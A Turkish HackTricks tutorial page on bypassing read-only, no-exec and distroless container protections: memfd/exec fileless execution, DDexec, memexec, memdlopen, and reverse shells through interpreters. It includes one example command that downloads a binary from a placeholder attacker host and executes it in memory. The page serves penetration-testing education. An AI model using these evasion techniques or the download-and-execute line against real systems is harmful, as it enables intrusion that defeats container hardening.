# FS korumalarını atlatma: salt okunur / no-exec / Distroless

<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
* [**Resmi PEASS & HackTricks ürünlerini edinin**](https://peass.creator-spring.com)
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri**ne ilgi duyuyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde yazılı ve konuşma yapabilme yeteneği gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

## Videolar

Aşağıdaki videolarda bu sayfada bahsedilen teknikleri daha detaylı açıklanmış şekilde bulabilirsiniz:

* [**DEF CON 31 - Gizlilik ve Kaçınma için Linux Bellek Manipülasyonu Keşfi**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng ve bellek içi dlopen() ile Gizli sızıntılar - HackTricks Takip 2023**](https://www.youtube.com/watch?v=VM\_gjjiARaU)

## salt okunur / no-exec senaryosu

Özellikle konteynerlerde **salt okunur (ro) dosya sistemi koruması** ile donatılmış linux makineleri bulmak artık daha yaygın hale gelmektedir. Bu, salt okunur dosya sistemiyle bir konteyner çalıştırmak için `securitycontext` içinde **`readOnlyRootFilesystem: true`** ayarlamak kadar kolaydır:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Ancak, dosya sistemi salt okunur olarak bağlanmış olsa bile, **`/dev/shm`** hala yazılabilir olacaktır, bu nedenle diske herhangi bir şey yazamayacağımızı düşünmek yanıltıcı olacaktır. Bununla birlikte, bu klasör **no-exec koruması ile bağlanacaktır**, bu nedenle buraya bir ikili dosya indirirseniz **onu çalıştıramayacaksınız**.

{% hint style="warning" %}
Kırmızı takım bakış açısından, bu, sistemde zaten olmayan (arka kapılar veya `kubectl` gibi) ikili dosyaları **indirip çalıştırmayı karmaşık hale getirir**.
{% endhint %}

## En Kolay Atlatma: Betikler

İkili dosyaları belirttiğimden bahsettim, **yürütülebilir herhangi bir betik** çalıştırabilirsiniz, yeter ki yorumlayıcı makinede içinde olsun, örneğin `sh` yüklüyse bir **kabuk betiği** veya `python` yüklüyse bir **python betiği** gibi.

Ancak, bu, ikili geri kapı veya çalıştırmanız gerekebilecek diğer ikili araçları çalıştırmak için yeterli değildir.

## Bellek Atlatmaları

Bir ikili dosyayı çalıştırmak istiyorsanız ancak dosya sistemi buna izin vermiyorsa, bunu yapmanın en iyi yolu, **bellekten çalıştırmaktır**, çünkü **korumalar orada uygulanmaz**.

### FD + exec syscall atlatma

Makinede **Python**, **Perl** veya **Ruby** gibi güçlü betik motorları varsa, ikili dosyayı bellekten çalıştırmak için indirebilir, bir bellek dosya tanımcısı içinde saklayabilirsiniz (`create_memfd` syscall), bu korumalar tarafından korunmayacak ve ardından bir **`exec` syscall** çağırarak **fd'yi çalıştırılacak dosya olarak belirtebilirsiniz**.

Bunun için kolayca [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) projesini kullanabilirsiniz. Bir ikili dosya geçirerek, **ikili dosyayı kodlanmış ve b64 kodlanmış olarak içeren** belirtilen dilde bir betik oluşturacak ve onu **çözümlemek ve sıkıştırmak** için talimatlarla birlikte `create_memfd` syscall'i çağırarak oluşturulan bir **fd** içinde saklayacak ve çalıştırmak için **exec** syscall'i çağıracaktır.

{% hint style="warning" %}
Bu, PHP veya Node gibi diğer betik dillerinde çalışmaz çünkü bunlar bir betikten **ham sistem çağrılarını çağırmak için varsayılan bir yol**a sahip değillerdir, bu nedenle `create_memfd`'yi çağırmak için **bellek fd** oluşturulamaz.

Ayrıca, `/dev/shm` içinde bir dosya ile **düzenli bir fd** oluşturmak çalışmayacaktır, çünkü **no-exec koruması** uygulanacağından çalıştırmanıza izin verilmeyecektir.
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec), kendi işleminizin **`/proc/self/mem`**'ini üzerine yazarak **belleğinizi değiştirmenizi** sağlayan bir tekniktir.

Bu nedenle, işlem tarafından yürütülen montaj kodunu kontrol ederek, bir **shellcode** yazabilir ve işlemi **herhangi bir keyfi kodu çalıştırmak üzere değiştirebilirsiniz**.

{% hint style="success" %}
**DDexec / EverythingExec**, kendi **shellcode**'unuzu yüklemenize ve **bellekten** kendi **shellcode**'unuzu veya **herhangi bir ikili dosyayı çalıştırmanıza** olanak tanır.
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
### MemExec

[**Memexec**](https://github.com/arget13/memexec), DDexec'in doğal bir sonraki adımıdır. Herhangi bir **farklı ikili dosyayı çalıştırmak istediğinizde DDexec'i yeniden başlatmanıza gerek kalmadan, sadece memexec shellcode'unu DDexec tekniği aracılığıyla çalıştırabilir ve ardından **bu deamon ile iletişim kurarak yüklemek ve çalıştırmak için yeni ikili dosyaları geçirebilirsiniz**.

**Memexec'i kullanarak PHP ters kabuk'tan ikili dosyaları çalıştırmak için bir örnek** [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) adresinde bulabilirsiniz.

### Memdlopen

DDexec'e benzer bir amaçla, [**memdlopen**](https://github.com/arget13/memdlopen) tekniği, daha sonra bunları çalıştırmak için belleğe ikili dosyaları yüklemenin **daha kolay bir yolunu** sağlar. Bağımlılıkları olan ikili dosyaları bile yüklemeyi mümkün kılabilir.

## Distroless Atlatma

### Distroless Nedir

Distroless konteynerler, yalnızca belirli bir uygulamayı veya hizmeti çalıştırmak için gerekli olan **en temel bileşenleri** içerir; kütüphaneler ve çalışma zamanı bağımlılıklarını içerir, ancak bir paket yöneticisi, kabuk veya sistem yardımcı programları gibi daha büyük bileşenleri hariç tutar.

Distroless konteynerlerin amacı, gereksiz bileşenleri ortadan kaldırarak konteynerlerin **saldırı yüzeyini azaltmak** ve sömürülebilecek güvenlik açıklarının sayısını en aza indirmektir.

### Ters Kabuk

Distroless konteynerlerde genellikle **`sh` veya `bash`** gibi düzenli bir kabuk bulamayabilirsiniz. Ayrıca, genellikle bir sistemde çalıştırdığınız `ls`, `whoami`, `id` gibi ikili dosyaları da bulamazsınız.

{% hint style="warning" %}
Bu nedenle, genellikle yaptığınız gibi bir **ters kabuk** alamayacak veya sistemde **numaralandıramayacaksınız**.
{% endhint %}

Ancak, ele geçirilen konteyner örneğin bir flask web çalıştırıyorsa, o zaman python yüklüdür ve bu nedenle bir **Python ters kabuk** alabilirsiniz. Node çalıştırıyorsa, bir Node ters kabuk alabilirsiniz ve çoğu **betik dili** ile aynı şeyi yapabilirsiniz.

{% hint style="success" %}
Betik dili kullanarak dilin yeteneklerini kullanarak **sistemi numaralandırabilirsiniz**.
{% endhint %}

Eğer **`read-only/no-exec`** korumaları yoksa, ters kabuğunuzu kullanarak **ikili dosyalarınızı dosya sistemine yazabilir** ve **çalıştırabilirsiniz**.

{% hint style="success" %}
Ancak, bu tür konteynerlerde genellikle bu korumalar bulunur, ancak bunları atlatmak için **önceki bellek yürütme tekniklerini kullanabilirsiniz**.
{% endhint %}

**RCE güvenlik açıklarını sömürmek** ve hafızadan ikili dosyaları çalıştırmak için **örnekler** bulabilirsiniz [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Eğer **hacking kariyeri** ile ilgileniyorsanız ve hacklenemez olanı hacklemek istiyorsanız - **işe alıyoruz!** (_akıcı şekilde yazılı ve konuşulan Lehçe gereklidir_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin**.
* **Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud** github depolarına PR'lar göndererek **hacking püf noktalarınızı paylaşın**.

</details>
